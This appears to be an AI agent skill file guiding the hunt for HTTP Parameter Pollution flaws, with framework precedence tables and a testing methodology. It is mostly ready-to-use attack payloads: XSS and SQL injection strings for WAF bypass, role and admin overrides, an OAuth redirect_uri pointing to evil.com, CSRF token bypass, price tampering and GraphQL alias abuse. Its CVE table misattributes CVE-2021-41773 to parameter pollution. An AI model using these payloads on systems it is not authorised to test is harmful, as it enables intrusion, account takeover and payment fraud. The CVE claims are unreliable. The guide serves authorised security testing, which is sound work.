---
name: hunt-parameter-pollution
description: "Hunt HTTP Parameter Pollution (HPP) vulnerabilities — duplicate parameter injection, backend vs frontend parsing differences, WAF bypass via HPP, server-side vs client-side HPP. Covers parameter handling behaviors per technology (ASP.NET first, PHP last, Perl concatenates, Flask arrays, Express first), URL/form/hybrid/JSON/GraphQL/WebSocket/cookie parameter pollution, parameter array notation confusion, parameter cloaking via encoding. Attack vectors: access control bypass, CSRF token bypass, SSRF augmentation, SQL query manipulation, filter evasion, OAuth redirect manipulation, API gateway vs backend precedence (IDOR). Real CVEs: CVE-2021-41773, CVE-2018-8033. Use when testing web applications for parameter handling flaws, WAF bypass, or when multiple application layers process the same request."
---

# HTTP Parameter Pollution (HPP)

## When to Use
- Testing applications with multiple processing layers (CDN → WAF → app → backend)
- WAF is blocking direct injection payloads
- OAuth/SAML flows with redirect parameters
- API endpoints with pagination/filtering
- E-commerce checkout flows (price/quantity)
- Any multi-step form or wizard

## When NOT to Use
- Single-layer application with consistent parameter handling
- Target only accepts JSON with strict schema validation

---

## Parameter Handling by Technology

| Technology | Behavior |
|---|---|
| ASP.NET/IIS | Uses **first** occurrence |
| PHP/Apache | Uses **last** occurrence |
| JSP/Tomcat | Uses **first** occurrence |
| Perl CGI | **Concatenates** with comma |
| Python/Flask | Builds **array** of values |
| Node.js/Express | Uses **first** (default) or array (qs parser) |

This inconsistency is the core of HPP — WAF checks one value, backend processes another.

---

## Attack Patterns

### WAF Bypass (most common use)
```
# WAF checks first parameter, backend processes last
?q=safe&q=<script>alert(1)</script>

# WAF checks first, backend uses last for SQL
?id=1&id=1 OR 1=1--
```

### Access Control Bypass
```
# Parameter override
?access=false&access=true
?role=user&role=admin
?user=attacker&user=victim
```

### IDOR via API Gateway Precedence
```
# Gateway picks first id, backend picks last → IDOR
/api/user?id=123&id=999
```

### OAuth Redirect Manipulation
```
# Duplicate redirect_uri — gateway validates first, IdP uses last
/oauth/authorize?redirect_uri=https://legit.com&redirect_uri=https://evil.com
```

### CSRF Token Bypass
```
# Duplicate anti-CSRF token
?token=valid_token&token=random_value&amount=1000
```

### Price/Quantity Manipulation
```
# E-commerce
?price=100&price=1
?quantity=1&quantity=100
```

---

## Testing Techniques

### URL Parameter Pollution
```
# Original
https://target.com/page?param=value1

# Polluted
https://target.com/page?param=value1&param=value2
```

### Form (POST body) Pollution
```
# Original POST body
parameter=original_value

# Polluted
parameter=original_value&parameter=malicious_value
```

### Hybrid (URL + POST body)
```
# URL: ?param=url_value
# POST body: param=body_value
# Which wins? Depends on framework.
```

### JSON Duplicate Keys
```json
{
  "role": "user",
  "role": "admin"
}
```
Most parsers: last wins. Some gateways reject duplicates while backends accept.

### Cookie Pollution
```
Cookie: session=abc; session=attacker
Cookie: role=user; role=admin
```

### GraphQL Pollution
```graphql
# Alias pollution — bypass rate limits
query {
  a: redeemCoupon(code: "SAVE50") { success }
  b: redeemCoupon(code: "SAVE50") { success }
  c: redeemCoupon(code: "SAVE50") { success }
}

# Variable pollution
query ($id: Int!, $id: Int!) {
  user(id: $id) { name }
}
```

### WebSocket Pollution
```json
{
  "action": "sendMessage",
  "room": "public",
  "room": "admin",
  "message": "test"
}
```

### Array Notation Confusion
```
# PHP expects brackets
param[]=value1&param[]=value2

# Express (qs) — bracket optional
param=value1&param=value2

# Rails — numeric indices
param[0]=value1&param[1]=value2

# Mix notations to confuse parsers
param=single&param[]=array1&param[0]=indexed
```

### Parameter Cloaking
```
# URL encoding variations
param=value1&par%61m=value2

# Case variation
param=value1&PARAM=value2

# Double encoding
param=value1&par%2561m=value2

# Unicode normalization
param=value1&pαram=value2  # Greek alpha
```

---

## Testing Methodology

1. **Map** all application parameters (URL, form, cookie, header)
2. **Test** each parameter with duplicates — observe which value wins
3. **Identify** layer differences (CDN vs WAF vs app vs backend)
4. **Exploit** the precedence gap for your target vuln class
5. **Chain** with other bugs (HPP + SQLi, HPP + XSS, HPP + IDOR)

---

## Real-World CVEs

| CVE | Description | Impact |
|---|---|---|
| CVE-2021-41773 | Apache path traversal via parameter pollution in URL normalization | RCE |
| CVE-2018-8033 | Apache OFBiz auth bypass via duplicate login params | Admin access |
| Multiple | OAuth redirect_uri duplication across vendors | ATO |
| Bug bounty | AWS API Gateway vs Lambda id precedence | IDOR |

---

## Impact Ratings

- **Critical** — HPP enables auth bypass or RCE
- **High** — HPP allows WAF bypass, payment manipulation, privilege escalation
- **Medium** — HPP bypasses rate limiting or validation controls
- **Low** — HPP causes logic errors with minimal security impact

---

## Tools

| Tool | Purpose |
|---|---|
| Burp Repeater | Manual duplicate parameter testing |
| Param Miner (Burp) | Discover hidden/unkeyed parameters |
| OWASP ZAP | HTTP fuzzer for parameter testing |
| Schemathesis | Fuzz OpenAPI endpoints for duplicate-field handling |

---

## Related Skills
- **`hunt-waf-bypass`** — HPP is a primary WAF bypass vector
- **`hunt-sqli`** — HPP to bypass SQLi filters
- **`hunt-xss`** — HPP to bypass XSS filters
- **`hunt-oauth`** — redirect_uri pollution for OAuth attacks
- **`hunt-idor`** — API gateway precedence for IDOR
- **`hunt-graphql`** — Alias/batch pollution for rate limit bypass
